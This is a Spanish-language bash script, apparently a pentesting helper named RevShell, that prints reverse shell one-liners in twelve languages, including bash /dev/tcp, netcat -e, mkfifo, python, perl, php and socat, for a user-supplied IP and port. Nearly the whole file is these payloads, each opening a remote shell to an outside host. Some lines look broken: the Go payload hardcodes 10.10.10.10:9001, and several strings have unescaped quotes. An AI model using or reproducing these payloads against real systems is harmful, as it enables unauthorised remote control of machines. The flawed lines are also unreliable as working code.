#!/bin/bash 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
lightRed="\e[0;91m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function banner(){
  echo -e "${purpleColour} _____             _____ _          _ _ \n|  __ \           / ____| |        | | |\n| |__) |_____   __ (___ | |__   ___| | |\n|  _  // _ \ \ / /\___ \| '_ \ / _ \ | |\n| | \ \  __/\ V / ____) | | | |  __/ | |\n|_|  \_\___| \_/ |_____/|_| |_|\___|_|_|${endColour}\n\t\t${greenColour}Created by: ${endColour}${yellowColour}ONYX${endColour}"
}

trap ctrl_c INT

function ctrl_c(){
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Saliendo...${endColour}\n"
    exit 1
}

function helpPanel(){
  banner 
  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Uso:${endColour}"
  echo -e "\t${purpleColour}l)${endColour}${grayColour} Lenguaje en el cual se creara la reverse shell.${endColour}${greenColour} Ejemplo ->${endColour} ${yellowColour}bash${endColour}${endColour}"
  echo -e "\t${purpleColour}i)${endColour}${grayColour} Tu dirección IP. ${endColour}${greenColour}Ejemplo ->${endColour}${yellowColour} 192.168.1.40${endColour}"
  echo -e "\t${purpleColour}p)${endColour}${grayColour} Puerto al cual se enviara la reverse shell.${endColour}${yellowColour} 443${endColour}"
  echo -e "\n${yellowColour}======================\n${grayColour}Lenguajes habilitados.\n${yellowColour}======================${endColour}"


	echo -e "ruby ->\t\tReverse Shell en ruby"
	echo -e "nc ->\t\tReverse Shell en netcat"
	echo -e "mkfifo ->\tReverse Shell en nc mkfifo"
	echo -e "lua ->\t\tReverse Shell en lua"
	echo -e "go ->\t\tReverse Shell en go"
	echo -e "socat ->\tReverse Shell con socat"
	echo -e "telnet ->\tReverse Shell con telnet"
	echo -e "zsh ->\t\tReverse Shell con zsh"
  echo -e "bash ->\t\tReverse Shell en bash"
	echo -e "python ->\tReverse Shell en python"
	echo -e "perl ->\t\tReverse Shell en perl"
	echo -e "php ->\t\tReverse Shell en php"
}

function payloads(){
  if [ $lenguaje == "ruby" ]; then
    RevRuby
  elif [ $lenguaje == "nc" ]; then
    RevNc
  elif [ $lenguaje == "mkfifo" ]; then
    RevMkfifo
  elif [ $lenguaje == "lua" ]; then
    RevLua
  elif [ $lenguaje == "go" ]; then
    RevGo
  elif [ $lenguaje == "socat" ]; then
    RevSocat
  elif [ $lenguaje == "telnet" ]; then
    RevTelnet
  elif [ $lenguaje == "zsh" ]; then 
    RevZsh
  elif [ $lenguaje == "bash" ]; then
    RevBash
  elif [ $lenguaje == "python" ]; then
    RevPython
  elif [ $lenguaje == "perl" ]; then
    RevPerl
  elif [ $lenguaje == "php" ]; then
    RevPhp
  else
    helpPanel
  fi 
}

function RevRuby(){
  shell="ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$ipAddress",$puerto))'"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}

function RevNc(){
  shell="nc -e /bin/bash $ipAddress $puerto"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"

}

function RevMkfifo(){
  shell="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $ipAddress $puerto >/tmp/f"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}

function RevLua(){
  shell="lua5.1 -e 'local host, port = "$ipAddress", $puerto local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}

function RevGo(){
  shell="echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp","10.10.10.10:9001\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"

}

function RevSocat(){
  shell="socat TCP:$ipAddress:$puerto EXEC:'sh',pty,stderr,setsid,sigint,sane"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}

function RevTelnet(){
  shell="TF=$(mktemp -u);mkfifo $TF && telnet $ipAddress $puerto 0<$TF | sh 1>$TF"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}

function RevZsh(){
  shell="zsh -c 'zmodload zsh/net/tcp && ztcp $ipAddress $puerto && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}

function RevBash(){
  shell="bash -i >& /dev/tcp/$ipAddress/$puerto 0>&1"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}

function RevPython(){
  shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ipAddress",$puerto));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}

function RevPerl(){
  shell="perl -e 'use Socket;$i="$ipAddress";$p=$puerto;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}

function RevPhp(){
  shell="php -r '$sock=fsockopen("$ipAddress",$puerto);exec(\"sh <&3 >&3 2>&3\");'"
  echo -e "${yellowColour}Reverse Shell${endColour} ==> $shell"
}


# Indicadores
declare -i parameter_counter=0

while getopts "l:i:p:h" arg; do
  case $arg in
    l) lenguaje="$OPTARG"; let parameter_counter+=1;;
    i) ipAddress="$OPTARG"; let parameter_counter+=2;;
    p) puerto="$OPTARG"; let parameter_counter+=3;;
    h) ;;
  esac
done

if [ $parameter_counter -eq 6 ]; then
  payloads
else
  helpPanel
fi

